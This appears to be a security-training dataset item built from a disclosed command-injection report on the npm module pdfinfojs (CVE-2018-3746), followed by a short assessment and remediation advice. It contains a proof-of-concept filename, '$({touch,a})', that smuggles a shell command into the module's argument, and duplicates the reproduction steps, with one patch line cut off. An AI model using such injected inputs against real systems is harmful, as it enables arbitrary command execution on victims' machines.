# CMDI — h1

- source: h1
- class: cmdi
- cwe: CWE-77
- cve: ['CVE-2018-3746']
- severity: high
- program: nodejs-ecosystem
- quality_score: 12

## Scenario

Analyze the following vulnerability report and provide a structured security assessment.

**Report Title:** [pdfinfojs] Command Injection on filename parameter
**Affected Asset:** pdfinfojs

**Vulnerability Description:**
Hello , there is a Command Injection vulnerability on the "pdfinfojs" module.

# Module

**module name:** pdfinfojs
**version:** 0.3.6
**npm page:** https://www.npmjs.com/package/pdfinfojs

## Module Description

> pdfinfo shell wrapper for Node.js

## Module Stats

10 downloads in the last day
61 downloads in the last week
106 downloads in the last month

# Vulnerability

## Vulnerability Description

> The module appends the filename parameter to the command on the lines [28](https://github.com/fagbokforlaget/pdfinfojs/blob/master/lib/pdfinfo.js#L28), [47](https://github.com/fagbokforlaget/pdfinfojs/blob/master/lib/pdfinfo.js#L47) and [72](https://github.com/fagbokforlaget/pdfinfojs/blob/master/lib/pdfinfo.js#L72) without parsing the user input, thus leading to a Command Injection. 

## Steps To Reproduce:

* Install the module 

```
$ npm install pdfinfojs
```

* Example code, similar to the documentation, with the malicious filename `$({touch,a})` :

```javascript
var pdfinfo = require('pdfinfojs'),
    pdf = new pdfinfo('$({touch,a})'); // Malicious payload

pdf.getInfo(function(err, info, params) {
  if (err) {
    console.error(err.stack);
  }
  else {
    console.log(info); //info is an object
    console.log(params); // commandline params passed to pdfinfo cmd
  }
});
```

*there are a lot of possibles payloads to achieve this, used this brace expansion just because space in the file name sucks*

* Run the code 

```
$ node index.js
Error
    ... it throws an error, but the execution is successful
```
* Check the newly created file 

```
$ ls
a		index.js
```

## Patch

It is advisable to use a module that explicitly isolates the parameters to the `pdfinfo` command.

## Tested on :

- macOS Sierra 10.12.16
- NODEJS v8.4.0
- NPM 5.3.0

**( contacted the maintainer || opened issue ) = False**

## Impact

An attacker can execute arbitrary commands on the victim's machine

**Steps to Reproduce:**
* Install the module 

```
$ npm install pdfinfojs
```

* Example code, similar to the documentation, with the malicious filename `$({touch,a})` :

```javascript
var pdfinfo = require('pdfinfojs'),
    pdf = new pdfinfo('$({touch,a})'); // Malicious payload

pdf.getInfo(function(err, info, params) {
  if (err) {
    console.error(err.stack);
  }
  else {
    console.log(info); //info is an object
    console.log(params); // commandline params passed to pdfinfo cmd
  }
});
```

*there are a lot of possibles payloads to achieve this, used this brace expansion just because space in the file name sucks*

* Run the code 

```
$ node index.js
Error
    ... it throws an error, but the execution is successful
```
* Check the newly created file 

```
$ ls
a		index.js
```

## Patch

It is advisable to use a module that explicitly isolates the

## Analysis / Response

**Vulnerability Class:** cmdi
**CWE:** CWE-77
**Weakness:** Command Injection - Generic
**Severity:** high
**Endpoint Pattern:** https://www.npmjs.com/package/pdfinfojs

**Impact Assessment:**
An attacker can execute arbitrary commands on the victim's machine

**Remediation:**
Avoid passing user input to system commands. Use language-native APIs instead of shell execution. If unavoidable, use strict allowlists for permitted values.
